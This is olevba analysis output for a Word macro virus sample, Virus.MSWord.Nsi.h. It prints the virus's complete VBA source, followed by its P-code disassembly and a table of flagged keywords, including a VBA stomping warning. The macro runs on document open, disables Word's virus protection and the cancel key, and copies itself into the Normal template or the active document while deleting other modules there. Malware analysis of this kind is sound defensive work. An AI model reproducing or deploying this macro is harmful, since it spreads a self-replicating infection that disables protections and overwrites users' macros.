olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nsi.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nsi.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





Private Sub Document_Close()

End Sub

Private Sub Document_Open()
    On Error Resume Next
    Options.VirusProtection = False
    EnableCancelKey = wdCancelDisabled
    Set maci = MacroContainer.VBProject.VBComponents.Item(1)
    Set macic = maci.CodeModule
    ns$ = Left(macic.lines(1, 1), 21)
    Set inf = NormalTemplate: nsi$ = ns$
        If MacroContainer = inf Then Set inf = ActiveDocument: nsi$ = ns$
    Set infc = inf.VBProject.VBComponents
    Set infi = infc.Item(1)
    Set infic = infi.CodeModule
    infi.Name = "ThisDocument"
    For mx = 2 To infc.Count
        infc.Remove infc.Item(2)
    Next mx
        If infic.countlines <> macic.CountOfLines Then
            infic.deletelines 1, infic.CountOfLines
            For coco = 1 To macic.CountOfLines
                infic.insertlines coco, macic.lines(coco, 1)
            Next coco
            infic.replaceline 1, nsi$
        End If
    If Left(ActiveDocument.Name, 8) <> Mid$(macic.lines(1, 1), 13, 8) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    EnableCancelKey = wdCancelDisabled
End Sub
'ThisDocument v 1.0 1999

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Nsi.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3200 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub Document_Close())
' Line #6:
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub Document_Open())
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #12:
' 	Ld wdCancelDisabled 
' 	St EnableCancelKey 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set maci 
' Line #14:
' 	SetStmt 
' 	Ld maci 
' 	MemLd CodeModule 
' 	Set macic 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0015 
' 	ArgsLd LBound 0x0002 
' 	St ns$ 
' Line #16:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set inf 
' 	BoS 0x0000 
' 	Ld ns$ 
' 	St nsi$ 
' Line #17:
' 	Ld MacroContainer 
' 	Ld inf 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set inf 
' 	BoS 0x0000 
' 	Ld ns$ 
' 	St nsi$ 
' 	EndIf 
' Line #18:
' 	SetStmt 
' 	Ld inf 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set infc 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld infc 
' 	ArgsMemLd Item 0x0001 
' 	Set infi 
' Line #20:
' 	SetStmt 
' 	Ld infi 
' 	MemLd CodeModule 
' 	Set infic 
' Line #21:
' 	LitStr 0x000C "ThisDocument"
' 	Ld infi 
' 	MemSt New 
' Line #22:
' 	StartForVariable 
' 	Ld mx 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld infc 
' 	MemLd Count 
' 	For 
' Line #23:
' 	LitDI2 0x0002 
' 	Ld infc 
' 	ArgsMemLd Item 0x0001 
' 	Ld infc 
' 	ArgsMemCall Remove 0x0001 
' Line #24:
' 	StartForVariable 
' 	Ld mx 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	Ld infic 
' 	MemLd countlines 
' 	Ld macic 
' 	MemLd CountOfLines 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld infic 
' 	MemLd CountOfLines 
' 	Ld infic 
' 	ArgsMemCall deletelines 0x0002 
' Line #27:
' 	StartForVariable 
' 	Ld coco 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	MemLd CountOfLines 
' 	For 
' Line #28:
' 	Ld coco 
' 	Ld coco 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	ArgsMemLd lines 0x0002 
' 	Ld infic 
' 	ArgsMemCall insertlines 0x0002 
' Line #29:
' 	StartForVariable 
' 	Ld coco 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld nsi$ 
' 	Ld infic 
' 	ArgsMemCall replaceline 0x0002 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000D 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$$ 0x0003 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #33:
' 	Ld wdCancelDisabled 
' 	St EnableCancelKey 
' Line #34:
' 	EndSub 
' Line #35:
' 	QuoteRem 0x0000 0x0017 "ThisDocument v 1.0 1999"
' Line #36:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

